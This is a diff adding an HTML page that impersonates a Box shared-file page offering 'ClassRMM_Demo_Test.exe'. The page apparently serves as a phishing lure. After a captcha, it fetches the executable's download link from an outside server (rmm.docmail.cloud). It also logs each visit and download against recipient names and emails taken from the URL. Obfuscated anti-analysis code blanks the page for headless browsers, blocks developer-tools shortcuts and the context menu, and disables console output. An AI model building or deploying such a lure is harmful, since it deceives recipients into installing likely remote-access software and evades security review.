@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ClassRMM_Demo_Test.exe - Box</title>
+<!-- 6d7a81c11b3da56c1585cd1cee138c8b9d86086149b27ecb1545841d794f63ca --><!-- cefd38bcfc7c6a58ac31221b -->
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Lato","Helvetica Neue",Arial,sans-serif;background:#f4f4f4;color:#333;min-height:100vh}
+.hdr{background:#fff;border-bottom:2px solid #0061d5;height:56px;display:flex;align-items:center;padding:0 28px;gap:14px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+.box-logo{font-size:28px;font-weight:900;color:#0061d5;letter-spacing:-1px;text-decoration:none}
+.hdr-tag{font-size:13px;color:#767676;border-left:1px solid #e0e0e0;padding-left:14px}
+.main{max-width:700px;margin:28px auto;padding:0 16px}
+.breadcrumb{font-size:12px;color:#767676;margin-bottom:10px}
+.file-card{background:#fff;border:1px solid #ddd;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.06)}
+.file-card-header{background:#f8f9fb;border-bottom:1px solid #ddd;padding:14px 20px;display:flex;align-items:center;gap:14px}
+.hdr-file-icon{flex-shrink:0}
+.hdr-file-info{flex:1;min-width:0}
+.hdr-fname{font-size:15px;font-weight:700;color:#222;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hdr-fmeta{font-size:12px;color:#767676;margin-top:2px}
+.card-actions{padding:10px 20px;border-bottom:1px solid #ddd;display:flex;gap:8px}
+.act-btn{display:inline-flex;align-items:center;gap:6px;padding:7px 16px;border-radius:4px;font-size:13px;font-weight:700;cursor:pointer;border:none;font-family:inherit}
+.act-btn.primary{background:#0061d5;color:#fff;display:none}
+.act-btn.primary:hover{background:#0052b3}
+.act-btn.secondary{background:#fff;color:#0061d5;border:2px solid #0061d5}
+.act-btn.secondary:hover{background:#f0f5ff}
+.card-body{padding:36px 20px;display:flex;flex-direction:column;align-items:center}
+.preview-icon{margin-bottom:14px}
+.box-fname{font-size:18px;font-weight:700;color:#222;text-align:center;margin-bottom:4px;word-break:break-all}
+.box-shared{font-size:13px;color:#767676;margin-bottom:6px}
+.box-msg{font-size:13px;color:#555;text-align:center}
+.recip{font-size:13px;color:#767676;display:none;margin-top:3px}
+.verify-panel{margin-top:22px;background:#f8f9fb;border:1px solid #ddd;border-radius:4px;padding:16px 18px;width:100%;max-width:390px}
+.verify-title{font-size:12px;font-weight:700;color:#333;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+.cap-row{display:flex;justify-content:center}
+#cap-err{color:#c0392b;font-size:12px;margin-top:8px;display:none;text-align:center}
+.box-footer{text-align:center;font-size:11px;color:#aaa;margin-top:22px;padding-bottom:12px}
+.box-footer a{color:#aaa;text-decoration:none}
+</style>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>(function(){
+var esgscywa=navigator.webdriver||false;
+var nhlgnoud=window.outerWidth===0||window.outerHeight===0;
+var ravhbeaq=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
+if(esgscywa||nhlgnoud||ravhbeaq){document.body.innerHTML='';return;}
+document.addEventListener('contextmenu',function(xxuxzksv){ xxuxzksv.preventDefault(); });
+document.addEventListener('keydown',function(pdvpuekr){
+  if(pdvpuekr.key==='F12'||(pdvpuekr.ctrlKey&&pdvpuekr.shiftKey&&(pdvpuekr.key==='I'||pdvpuekr.key==='J'||pdvpuekr.key==='C'))||(pdvpuekr.ctrlKey&&pdvpuekr.key==='U'))
+  { pdvpuekr.preventDefault();return false; }
+});
+try{['log','warn','error','info','debug','table','dir','trace'].forEach(function(m){console[m]=function(){};}); }catch(_){}
+})();</script>
+</head>
+<body>
+<div class="hdr">
+  <a class="box-logo" href="#">Box</a>
+  <span class="hdr-tag">Shared file</span>
+</div>
+<div class="main">
+  <div class="breadcrumb">Shared by ClassRMM</div>
+  <div class="file-card">
+    <div class="file-card-header">
+      <div class="hdr-file-icon">
+        <svg width="36" height="44" viewBox="0 0 64 80">
+          <path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#0061d5"/>
+          <path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.2)"/>
+          <rect x="12" y="32" width="40" height="5" rx="2.5" fill="white" opacity=".85"/>
+          <rect x="12" y="43" width="28" height="4" rx="2" fill="white" opacity=".6"/>
+          <rect x="12" y="53" width="34" height="4" rx="2" fill="white" opacity=".6"/>
+          <rect x="12" y="63" width="20" height="4" rx="2" fill="white" opacity=".4"/>
+        </svg>
+      </div>
+      <div class="hdr-file-info">
+        <div class="hdr-fname">ClassRMM_Demo_Test.exe</div>
+        <div class="hdr-fmeta">Shared by ClassRMM</div>
+      </div>
+    </div>
+    <div class="card-actions">
+      <button class="act-btn primary" id="dl-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M13 5v8.586l3.293-3.293 1.414 1.414L12 17.414l-5.707-5.707 1.414-1.414L11 13.586V5h2zm-7 14h12v-2H6v2z"/></svg>
+        Download
+      </button>
+      <button class="act-btn secondary">Request Access</button>
+    </div>
+    <div class="card-body">
+      <div class="preview-icon">
+        <svg width="72" height="88" viewBox="0 0 64 80">
+          <path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#e8ecf1"/>
+          <path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="#cdd4dd"/>
+          <rect x="12" y="32" width="40" height="4" rx="2" fill="#9aaabb"/>
+          <rect x="12" y="42" width="28" height="4" rx="2" fill="#b8c4d0"/>
+          <rect x="12" y="52" width="34" height="4" rx="2" fill="#b8c4d0"/>
+          <rect x="12" y="62" width="20" height="4" rx="2" fill="#c8d0d8"/>
+        </svg>
+      </div>
+      <div class="box-fname">ClassRMM_Demo_Test.exe</div>
+      <div class="box-shared">Shared by ClassRMM</div>
+      <div class="box-msg">Test file — verifying Generate Link works end-to-end.</div>
+      <div class="recip" id="recipient-info"></div>
+      <div class="verify-panel">
+        <div class="verify-title">Security Verification Required</div>
+        <div class="cap-row">
+          <div class="cf-turnstile" data-sitekey="0x4AAAAAADEUnhXoe-14ZEdK" data-callback="onCaptchaSuccess"></div>
+        </div>
+        <div id="cap-err"></div>
+      </div>
+    </div>
+  </div>
+  <div class="box-footer">&copy; 2025 Box, Inc. &nbsp;&middot;&nbsp; <a href="#">Privacy Policy</a> &nbsp;&middot;&nbsp; <a href="#">Terms of Service</a></div>
+</div>
+<script>
+var _srv='https://rmm.docmail.cloud';var _lid=30;
+function _trk(evt){try{fetch(_srv+'/generate-link/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,event:evt})})}catch(_){}}
+async function onCaptchaSuccess(token){
+var btn=document.getElementById('dl-btn');var err=document.getElementById('cap-err');
+err.style.display='none';
+try{
+var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
+var d=await r.json();
+if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();return;}
+var a=document.createElement('a');a.href=d.url;a.download=d.display_name||'';document.body.appendChild(a);
+btn.style.display=btn.dataset.display||'inline-flex';btn.onclick=function(){_trk('download');a.click();};
+}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();}
+}
+function getParams(){
+var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
+var el=document.getElementById('recipient-info');if(!el)return;
+if(n||e){el.style.display='block';
+if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
+else el.textContent='For: '+decodeURIComponent(n||e);}
+}
+window.addEventListener('load',function(){getParams();_trk('visit');});</script>
+</body></html>
